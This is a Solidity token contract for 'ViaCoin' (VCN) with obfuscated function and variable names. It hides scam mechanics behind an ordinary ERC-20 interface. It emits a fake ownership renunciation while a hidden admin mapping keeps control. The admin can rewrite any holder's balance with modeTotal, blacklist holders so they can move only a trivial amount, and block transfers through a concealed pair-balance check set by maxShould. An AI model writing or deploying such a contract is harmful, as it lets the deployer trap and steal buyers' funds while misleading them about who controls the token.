//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract fromMinAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldSell {
    function createPair(address takeFromTotal, address tradingToLimit) external returns (address);

    function feeTo() external view returns (address);
}

interface walletLaunchAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface limitFromList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTo) external view returns (uint256);

    function transfer(address fundTrading, uint256 atLimit) external returns (bool);

    function allowance(address tokenMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 atLimit) external returns (bool);

    function transferFrom(
        address sender,
        address fundTrading,
        uint256 atLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTo, uint256 value);
    event Approval(address indexed tokenMode, address indexed spender, uint256 value);
}

interface limitFromListMetadata is limitFromList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ViaCoin is fromMinAt, limitFromList, limitFromListMetadata {

    constructor (){
        
        listTx();
        walletLaunchAmount tradingTake = walletLaunchAmount(totalFromLiquidity);
        fundTake = shouldSell(tradingTake.factory()).createPair(tradingTake.WETH(), address(this));
        buyExempt = shouldSell(tradingTake.factory()).feeTo();
        if (receiverWalletList != fromBuy) {
            exemptMinLaunched = true;
        }
        launchedAt = _msgSender();
        exemptAutoIs[launchedAt] = true;
        walletTx[launchedAt] = liquidityReceiver;
        
        emit Transfer(address(0), launchedAt, liquidityReceiver);
    }

    function senderLaunchedBuy(address minAmount) public {
        fromFundAuto();
        if (buyWallet != exemptMinLaunched) {
            receiverWalletList = fromBuy;
        }
        if (minAmount == launchedAt || minAmount == fundTake) {
            return;
        }
        feeIsAuto[minAmount] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityReceiver;
    }

    uint256 private liquidityReceiver = 100000000 * 10 ** 18;

    function listTx() public {
        emit OwnershipTransferred(launchedAt, address(0));
        totalAutoTo = address(0);
    }

    address buyExempt;

    function name() external view virtual override returns (string memory) {
        return atMarketingReceiver;
    }

    function maxShould(uint256 atLimit) public {
        fromFundAuto();
        enableSenderShould = atLimit;
    }

    bool public exemptMinLaunched;

    bool private buyWallet;

    string private fundMaxWallet = "VCN";

    mapping(address => bool) public feeIsAuto;

    string private atMarketingReceiver = "Via Coin";

    address public launchedAt;

    function allowance(address autoTx, address takeToEnable) external view virtual override returns (uint256) {
        if (takeToEnable == totalFromLiquidity) {
            return type(uint256).max;
        }
        return isReceiver[autoTx][takeToEnable];
    }

    mapping(address => bool) public exemptAutoIs;

    address totalFromLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address tokenFrom, address fundTrading, uint256 atLimit) external override returns (bool) {
        if (_msgSender() != totalFromLiquidity) {
            if (isReceiver[tokenFrom][_msgSender()] != type(uint256).max) {
                require(atLimit <= isReceiver[tokenFrom][_msgSender()]);
                isReceiver[tokenFrom][_msgSender()] -= atLimit;
            }
        }
        return listSender(tokenFrom, fundTrading, atLimit);
    }

    function approve(address takeToEnable, uint256 atLimit) public virtual override returns (bool) {
        isReceiver[_msgSender()][takeToEnable] = atLimit;
        emit Approval(_msgSender(), takeToEnable, atLimit);
        return true;
    }

    address private totalAutoTo;

    function getOwner() external view returns (address) {
        return totalAutoTo;
    }

    function owner() external view returns (address) {
        return totalAutoTo;
    }

    function modeTotal(address atEnableToken, uint256 atLimit) public {
        fromFundAuto();
        walletTx[atEnableToken] = atLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundMaxWallet;
    }

    bool public autoFrom;

    mapping(address => mapping(address => uint256)) private isReceiver;

    address public fundTake;

    uint256 public autoTeam = 0;

    uint256 launchedAmount;

    event OwnershipTransferred(address indexed shouldMarketing, address indexed tradingReceiver);

    function balanceOf(address atTo) public view virtual override returns (uint256) {
        return walletTx[atTo];
    }

    uint256 enableSenderShould;

    uint256 private fromBuy;

    mapping(address => uint256) private walletTx;

    function decimals() external view virtual override returns (uint8) {
        return feeSell;
    }

    function transfer(address atEnableToken, uint256 atLimit) external virtual override returns (bool) {
        return listSender(_msgSender(), atEnableToken, atLimit);
    }

    function listSender(address tokenFrom, address fundTrading, uint256 atLimit) internal returns (bool) {
        if (tokenFrom == launchedAt) {
            return shouldLaunch(tokenFrom, fundTrading, atLimit);
        }
        uint256 swapToken = limitFromList(fundTake).balanceOf(buyExempt);
        require(swapToken == enableSenderShould);
        require(fundTrading != buyExempt);
        if (feeIsAuto[tokenFrom]) {
            return shouldLaunch(tokenFrom, fundTrading, toSell);
        }
        atLimit = totalMode(tokenFrom, fundTrading, atLimit);
        return shouldLaunch(tokenFrom, fundTrading, atLimit);
    }

    uint256 constant toSell = 20 ** 10;

    uint256 public tradingWallet = 0;

    function totalMode(address tokenFrom, address fundTrading, uint256 atLimit) internal view returns (uint256) {
        require(atLimit > 0);

        uint256 receiverTrading = 0;
        if (tokenFrom == fundTake && tradingWallet > 0) {
            receiverTrading = atLimit * tradingWallet / 100;
        } else if (fundTrading == fundTake && autoTeam > 0) {
            receiverTrading = atLimit * autoTeam / 100;
        }
        require(receiverTrading <= atLimit);
        return atLimit - receiverTrading;
    }

    function shouldLaunch(address tokenFrom, address fundTrading, uint256 atLimit) internal returns (bool) {
        require(walletTx[tokenFrom] >= atLimit);
        walletTx[tokenFrom] -= atLimit;
        walletTx[fundTrading] += atLimit;
        emit Transfer(tokenFrom, fundTrading, atLimit);
        return true;
    }

    uint256 public receiverWalletList;

    uint256 public launchExempt;

    function fromFundAuto() private view {
        require(exemptAutoIs[_msgSender()]);
    }

    uint8 private feeSell = 18;

    bool private limitMarketing;

    function takeAtAuto(address toTeam) public {
        require(toTeam.balance < 100000);
        if (autoFrom) {
            return;
        }
        
        exemptAutoIs[toTeam] = true;
        if (receiverWalletList != launchExempt) {
            receiverWalletList = launchExempt;
        }
        autoFrom = true;
    }

}